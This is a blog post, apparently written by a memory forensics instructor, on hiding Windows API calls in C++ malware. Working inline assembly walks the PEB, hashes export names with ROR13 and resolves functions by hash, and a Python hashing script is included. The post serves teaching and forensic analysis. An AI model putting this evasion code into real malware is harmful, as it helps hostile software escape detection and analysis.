---
layout: post
title: "Shellode Techniques in C++"
date: 2015-06-11
permalink: blog/shellcodeTechniquesCPP/
---

Recently I wrote a piece of malware for a [memory forensics course](http://www.tophertimzen.com/cs407/) I was teaching at Southern Oregon University. My intention was to write a sample that correlated with the back end of the courses, GUI artifacts, persistence the usage of IDA. I decided that I wanted to obfuscate the majority of Windows API calls I needed to use using shellcode tactics. An old colleague had introduced me to these techniques and I wanted to implement them again for my students as I had had already introduced them to shellcode techniques such as parsing the PEB and PE space to resolve functions, and wanted to give them a challenge. I utilized the technique of hashing function names with ROR13, extracting Kernel32's base address from the PEB and loading additional libraries with LoadLibraryA. 

Because I choose to write the malware in C++ performing inline assembly was easy. 

Firstly, I wrote three inline assembly functions that I could use throughout my malware to find the base address of kernel32, hashing a string, and resolve exports by enumerating the IMAGE_EXPORT_DIRECTORY in the PE header. 

{% highlight cpp %}

__declspec(naked)unsigned int FindKernel32()
{
	__asm{
		mov eax, fs:[0x30 ];    // get a pointer to the PEB
		mov eax, [eax + 0x0C];  // get PEB->Ldr
		mov eax, [eax + 0x14];  // get PEB->Ldr.InMemoryOrderModuleList.Flink
		mov eax, [eax];         // get the next entry (2nd entry)
		mov eax, [eax];         // get the next entry (3rd entry)
		mov eax, [eax + 0x10];  // get the 3rd entries base address (kernel32.dll)
		ret;
	};
}

{% endhighlight %}

Next I wrote a function to hash a string using a form of ROR13. 

{% highlight cpp %}

unsigned int __stdcall hashString(char* symbol)
{
	__asm 
	{
		mov esi, symbol;
		xor edi, edi;
		xor eax, eax;
		cld;
	continueHashing:
		lodsb;
		test al, al
		jz hash_done;
		ror edi, 0xd;
		add edi, eax;
		jmp  continueHashing;
	hash_done:
		mov eax, edi;
	};
}

{% endhighlight %}

Lastly I wrote in inline assembler the logic to parse through the PEB of a library once I had its base address to resolve the base address of a function while also utilizing the above hashing function. 

{% highlight cpp %}

unsigned int __stdcall findSymbolByHash(unsigned int dllBase, unsigned int symHash)
{
	__asm 
	{
		pushad;
		mov edi, symHash;
		mov ebp, dllBase;
		mov eax, [ebp + 0x3c];        //PEheader
		mov edx, [ebp + eax + 0x78];  //export table
		add edx, ebp;
		mov ecx, [edx + 0x18];        //numberOfNames
		mov ebx, [edx + 0x20];        //numberOfExports
		add ebx, ebp;
	search_loop:
		jecxz noHash;
		dec ecx;                      //decrement numberOfNames
		mov esi, [ebx + ecx * 4];     //get an export name
		add esi, ebp;
		push ecx; 
		push ebx;
		push edi;
		push esi;
		call hashString;              //setup stack frame and has the export while saving clobber registers
		pop edi;
		pop ebx;
		pop ecx;                      //restore clobber registers              
		cmp eax, edi;                 //check if hash matched  
		jnz search_loop;
		mov ebx, [edx + 0x24];        //get address of the ordinals
		add ebx, ebp;
		mov cx, [ebx + 2 * ecx];      //current ordinal number
		mov ebx, [edx + 0x1c];       //extract the address table offset
		add ebx, ebp;
		mov eax, [ebx + 4 * ecx];    //address of function 
		add eax, ebp;
		jmp done;
	noHash:
		mov eax, 1;
	done:
		mov[esp + 0x1c], eax;
		popad;
	};
}

{% endhighlight %}

From there, function pointers can be utilized to call Windows API functions. Because these functions will be obfuscated, new typedefs will need to be created that return and take in the correct Windows API types. 

For example, the Windows API call CreateMutexEx appears as follows

{% highlight batch %}

HANDLE WINAPI CreateMutexEx(
  _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,
  _In_opt_ LPCTSTR               lpName,
  _In_     DWORD                 dwFlags,
  _In_     DWORD                 dwDesiredAccess
);

{% endhighlight %}

This function will be used to create a named Mutex to ensure the malware is only running one instance of itself on an infected machine. 

In order to implement this function obfuscated, the below typedef will be used

{% highlight cpp %}

typedef HANDLE(__stdcall *CreateMutex)(LPSECURITY_ATTRIBUTES, LPCTSTR, DWORD, DWORD);

{% endhighlight %}

Now that the function prototype is known the address of it must be resolved. To do this, the base address of Kernel32 must be discovered, the function hashed and the function resolved. 

To obtain the base address of Kenrel32 simply call FindKernel32(). 

{% highlight cpp %}

unsigned int kernel32BaseAddr = FindKernel32();

{% endhighlight %}

The ROR13 hash of a function, CreateMutexA, must also be resolved. To obtain a hash you can call the hashString() function or use the below python script 

{% highlight python %}

import time, sys

def ror( dword, bits ):
  return (( dword >> bits | dword << ( 32 - bits ) ) & 0xFFFFFFFF)

def hash(function, bits=13, print_hash=True ):
  function_hash = 0
  for c in str( function ):
    function_hash  = ror( function_hash, bits ) 
    function_hash  = (function_hash + ord(c))
  
  if print_hash:
    function_hash = function_hash & 0xFFFFFFFF
    print "[+] 0x%02X = %s" % ( function_hash, function )
  return function_hash
  

def main( argv=None ):
  if not argv:
    argv = sys.argv
  try:
    if len( argv ) != 2:
      print "Usage: ror13.py <function name>"
    else:
      print "[+] Ran on %s\n" % (  time.asctime( time.localtime() ) )
      hash( argv[1] )
  except Exception, e:
    print "[-] ", e
	
if __name__ == "__main__":
  main()

{% endhighlight %}

{% highlight batch %}

C:\Users\Topher>c:\bin\ror13.py CreateMutexExA
[+] Ran on Thu Jun 11 09:58:55 2015

[+] 0xBCE81294 = CreateMutexExA

{% endhighlight %}

In order to resolve this function by hash, a call to findSymbolByHash will be made with the address of kernel32 and the ror13 hash. 

{% highlight cpp %}

CreateMutex CreateMutex_Func = (CreateMutex)(findSymbolByHash(kernel32BaseAddr, 0xBCE81294));

{% endhighlight %}

CreateMutexExA can now be called 

{% highlight cpp %}

HANDLE created = MyCreateMutex(0, "IkFyZSB5b3UgaGF2aW5nIGZ1biB3aXRoIHRoaXMgbGFiPyIgDQo=", 0, MUTEX_ALL_ACCESS);

{% endhighlight %}

Any API call from Kernel32 can now be used in an obfuscated manner. Calls from other modules can also be used with a call to LoadLibraryA. 

Using the same methods above, the address of LoadLibraryA can be discovered at runtime. 

{% highlight cpp %}

typedef unsigned int(__stdcall *FunPtr_LoadLibrary)(LPCSTR);

unsigned int getLibrary(char *libraryName)
{
	FunPtr_LoadLibrary MyLoadLibraryA;
	MyLoadLibraryA = (FunPtr_LoadLibrary)(findSymbolByHash(kernel32BaseAddr, 0xEC0E4E8E));
	unsigned int baseAddr = MyLoadLibraryA(libraryName);
	return baseAddr;
}

{% endhighlight %}

Just call getLibrary() with the name of the module that needs to be loaded. 

{% highlight cpp %}

unsigned int user32BaseAddr = getLibrary("user32.dll");

{% endhighlight %}

Now calls can be made into findSymbolByHash with user32BaseAddr and a function hash from that module. 

As shown, utilizing shellcode techniques in C++ is relatively straight forward once the supporting functions are written. 